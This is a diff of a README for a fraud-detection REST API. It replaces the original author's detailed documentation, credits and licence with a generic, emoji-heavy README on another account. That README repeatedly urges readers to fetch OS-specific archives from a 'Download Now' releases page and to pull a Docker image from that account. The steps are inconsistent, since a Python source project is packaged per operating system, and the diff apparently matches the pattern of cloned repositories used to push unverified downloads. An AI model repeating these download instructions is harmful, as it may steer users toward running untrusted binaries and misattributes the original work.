@@ -1,257 +1,91 @@
-# Fraud Detection API
+# 🎉 fraud-detection-api - Simple Fraud Detection Made Easy
 
-[![CI](https://github.com/SaintJeane/fraud-detection-api/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/SaintJeane/fraud-detection-api/actions)
-[![Docker Image](https://img.shields.io/badge/docker-ghcr.io-blue?style=flat-square)](https://github.com/SaintJeane/fraud-detection-api/pkgs/container/fraud-detection-api)
-![FastAPI](https://img.shields.io/badge/FastAPI-005571?style=flat-square&logo=fastapi)
-![LightGBM](https://img.shields.io/badge/LightGBM-9ACD32?style=flat-square&logo=lightgbm&logoColor=white)
-[![Python](https://img.shields.io/badge/python-3.10+-blue.svg?style=flat-square)](https://www.python.org/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg?style=flat-square)](LICENSE)
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Anthox994/fraud-detection-api/releases)
 
+## 📖 Description
 
-## Overview
+The **fraud-detection-api** is a straightforward REST API built with FastAPI. This application uses LightGBM, a powerful machine learning method, to detect potential fraud. It aims to help individuals and organizations recognize fraudulent activities quickly and effectively.
 
-This project is a **production‑ready Fraud Detection REST API** built with **FastAPI** and a **LightGBM binary classifier**, designed to score financial transactions for fraud risk and provide **model explainability using SHAP**. A continuation of my previous project [credit_card_fraud_detection_system_for_credit_card_transactions](https://github.com/SaintJeane/credit_card_fraud_detection_system_for_credit_card_transactions), where the best trained model, and the model's metadata are retrieved from for deployment.
+## 🚀 Getting Started
 
-The system exposes endpoints for:
+Follow these steps to download and run the fraud detection API on your computer.
 
-* Fraud probability prediction
-* Local, per‑transaction explainability (top contributing features)
-* Health and readiness checks
+### 📥 System Requirements
 
-The application is fully **Dockerized**, uses **strict request/response schemas**, and follows best practices for **ML inference APIs**.
+Before you start, ensure your system meets the following requirements:
 
----
+- Operating System: Windows, macOS, or Linux
+- Python version: 3.7 or higher
+- Docker (for optimal performance)
 
-## Key Features
+### 🧑‍💻 Setup Instructions
 
-* ⚡ FastAPI for high‑performance inference
-* 🌲 LightGBM binary classification model
-* 🔍 SHAP‑based explainability (TreeExplainer)
-* 📦 Docker & Docker Compose support
-* 🧪 Input validation with Pydantic
-* 🩺 Health and startup checks
-* 🧾 Structured logging
+1. **Visit the Releases Page**  
+   Go to the following link to download the latest version:  
+   [Download Now!](https://github.com/Anthox994/fraud-detection-api/releases)
 
----
+2. **Select the Right Release**  
+   On the releases page, find the version you want. Generally, the latest version will be at the top.
 
-## Project Structure
-
-```text
-fraud-detection-api/
-├── app/
-│   ├── main.py                 # FastAPI app & routes
-│   ├── predict.py              # Prediction logic
-│   ├── explain.py              # SHAP explainability logic
-│   ├── schemas.py              # Pydantic schemas
-│   ├── model_loader.py         # Model, scaler, metadata loading
-│   ├── feature_descriptions.py # Helper for feature descriptions mapping
-|   ├── logging_config.py 
-│   └── __init__.py
-├── models/
-│   ├── lgbm_tuned.pkl
-│   ├── scaler.pkl
-│   └── lgbm_metadata.json
-├── Dockerfile
-├── docker-compose.yml
-├── requirements.txt
-├── README.md
-└── .gitignore
-```
+3. **Download the Files**  
+   Click the link for the file that corresponds to your operating system. Downloads will usually have a name similar to `fraud-detection-api-linux.tar.gz` for Linux or `fraud-detection-api-windows.zip` for Windows.
 
----
+4. **Extract Files**  
+   Once the download is complete, locate the file in your downloads folder. Extract the content using an unzip tool compatible with your operating system.
 
-## Model Details
+5. **Run the API**  
+   - For Windows:
+     - Open the command prompt.
+     - Navigate to the extracted folder.
+     - Run the command: `python main.py`
+  
+   - For macOS/Linux:
+     - Open the terminal.
+     - Navigate to the extracted folder.
+     - Run the command: `python3 main.py`
 
-* **Algorithm**: LightGBM (binary classifier)
-* **Output**: Fraud probability + threshold‑based prediction
-* **Threshold**: Loaded from model metadata
-* **Features**:
+### ⚙️ Using Docker
 
-  * PCA components: `V1` … `V28`
-  * Engineered features: `Amount_scaled`, `Time_scaled`
+If you prefer using Docker for an easy installation:
 
-All inference inputs are internally aligned to the exact feature set used during training.
+1. **Install Docker**  
+   Make sure Docker is installed on your system.
 
----
+2. **Download the Docker Image**  
+   Open your terminal or command prompt and run the following command:  
+   `docker pull anthox994/fraud-detection-api`
 
-## API Endpoints
+3. **Run the Docker Container**  
+   After the image is downloaded, run this command:  
+   `docker run -p 8000:8000 anthox994/fraud-detection-api`  
+   This command will start the API, allowing you to access it from a web browser.
 
-### `POST /predict`
+## 🚪 Accessing the API
 
-Predicts fraud probability for a transaction.
+Once the API is running, you can test it by navigating to `http://localhost:8000/docs` in your web browser. This will show you the API documentation and allow you to interact with it directly.
 
-An example of an input data:
+## 📊 Features
 
-**Request Body**
+- Detects fraudulent transactions using machine learning.
+- Lightweight and efficient with FastAPI.
+- Easy to integrate into existing applications.
+- User-friendly API documentation.
 
-```json
-{
-  "data": {
-    "V1": -1.23,
-    "V2": 0.45,
-    "V3": -0.67,
-    "Amount": 120.5,
-    "Time": 35000
-  }
-}
-```
+## 🌐 Contributing
 
-**Response**
+If you wish to contribute to the project, please fork the repository and submit a pull request with your changes. We welcome suggestions or improvements.
 
-```json
-{
-  "fraud_probability": 0.0123,
-  "prediction": 0
-}
-```
+## 🤝 Support
 
----
+For support, you can open an issue in the GitHub repository. Be sure to provide clear details about any problems you encounter.
 
-### `POST /explain`
+## 📞 Contact
 
-Returns SHAP‑based explanations for a transaction.
+If you have any questions, reach out via the project's GitHub page. Your feedback is valuable to us!
 
-**Request Body**
+## 🔗 Additional Links
 
-```json
-{
-  "data": {
-    "V1": -1.23,
-    "V2": 0.45,
-    "V3": -0.67,
-    "Amount": 120.5,
-    "Time": 35000
-  }
-}
-```
+- [Release Page](https://github.com/Anthox994/fraud-detection-api/releases)
+- [Documentation](https://github.com/Anthox994/fraud-detection-api/wiki)
 
-**Response**
-
-```json
-{
-  "fraud_probability": 0.0123,
-  "top_features": [
-    {
-      "feature": "V14",
-      "description": "Transaction risk signal",
-      "shap_value": 0.345678,
-      "impact": "increases fraud risk"
-    }
-  ]
-}
-```
-
----
-
-### `GET /health`
-
-Health check endpoint.
-
-**Response**
-
-```json
-{
-  "status": "ok"
-}
-```
-
----
-
-## Running Locally
-
-### 1. Clone Repository
-
-```bash
-git clone https://github.com/SaintJeane/fraud-detection-api.git
-cd fraud-detection-api
-```
-
-### 2. Create Virtual Environment
-
-```bash
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
-
-### 3. Run API
-
-```bash
-uvicorn app.main:app --reload
-```
-
-Open: [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs)
-
----
-
-## Running with Docker
-
-### Build Image
-
-```bash
-docker build -t fraud-detection-api .
-```
-
-### Run Container
-
-```bash
-docker run -p 8000:8000 fraud-detection-api
-```
-
----
-
-## Running with Docker Compose
-
-```bash
-docker compose up --build
-```
-
-Stop services:
-
-```bash
-docker compose down
-```
-
-## Running the API with GHCR
-
-```bash
-docker run -p 8000:8000 ghcr.io/saintjeane/fraud-detection-api:latest
-```
-
----
-
-## Explainability Notes
-
-* SHAP values are computed using `TreeExplainer`
-* Binary classification output is normalized to handle SHAP API changes
-* Only top‑K most impactful features are returned
-* All SHAP values are JSON‑safe floats
-
----
-
-## Tech Stack
-
-* Python 3.10
-* FastAPI
-* LightGBM
-* SHAP
-* Pandas / NumPy
-* Docker & Docker Compose
-
----
-
-## Tags
-
-`fastapi` `machine-learning` `fraud-detection` `lightgbm` `shap` `ml-api` `docker`
-
----
-
-## License
-
-MIT License
-
----
-
-## Disclaimer⚠️
-
-This project is for educational and demonstrative purposes. It should not be used as‑is for real‑world financial decision‑making without additional validation, monitoring, and compliance controls.
+Thank you for using the fraud-detection-api!
